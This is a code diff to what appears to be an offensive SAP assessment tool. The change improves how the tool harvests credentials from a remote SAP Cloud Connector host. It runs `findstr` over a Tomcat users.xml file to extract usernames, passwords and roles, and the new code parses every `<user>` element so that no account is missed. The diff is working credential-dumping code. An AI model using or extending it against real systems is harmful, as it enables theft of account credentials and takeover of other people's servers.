@@ -2015,7 +2015,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"/c findstr /i \"username= password= roles=\" \"{fpath}\"")
                     print(f"[*] SCC {host}: findstr → "
                           f"{len(findstr_out)}B out={findstr_out[:120]!r}")
-                    # Parse attributes from the line(s) returned
+                    # Parse every <user .../> element from the output.
+                    # Tomcat saves users.xml as a single long line with all
+                    # <user> elements concatenated, so iterate by element
+                    # (re.finditer) rather than by line / re.search — the
+                    # latter only catches the first match.  Attribute order
+                    # also varies (some installs emit roles/groups before
+                    # username), so we extract attrs name-keyed instead of
+                    # positionally.
                     import re as _re2
                     raw = None
                     xml_parts = [
@@ -2023,19 +2030,16 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         b'<tomcat-users>',
                     ]
                     found_users = 0
-                    for line in findstr_out.splitlines():
-                        line = line.strip()
-                        if not line or 'username' not in line.lower():
-                            continue
-                        uname = (_re2.search(r'username=["\']([^"\']+)["\']',
-                                             line, _re2.I) or
-                                 type('',(),{'group':lambda s,i:''})()).group(1)
-                        pwd   = (_re2.search(r'password=["\']([^"\']+)["\']',
-                                             line, _re2.I) or
-                                 type('',(),{'group':lambda s,i:''})()).group(1)
-                        roles = (_re2.search(r'roles=["\']([^"\']*)["\']',
-                                             line, _re2.I) or
-                                 type('',(),{'group':lambda s,i:''})()).group(1)
+                    user_re = _re2.compile(r'<user\b([^/>]*)/?\s*>',
+                                            _re2.IGNORECASE)
+                    attr_re = _re2.compile(r'(\w+)\s*=\s*["\']([^"\']*)["\']',
+                                            _re2.IGNORECASE)
+                    for m in user_re.finditer(findstr_out):
+                        attrs = {k.lower(): v
+                                  for k, v in attr_re.findall(m.group(1))}
+                        uname = attrs.get("username", "")
+                        pwd   = attrs.get("password", "")
+                        roles = attrs.get("roles", "")
                         if uname:
                             xml_parts.append(
                                 f'  <user username="{uname}" '
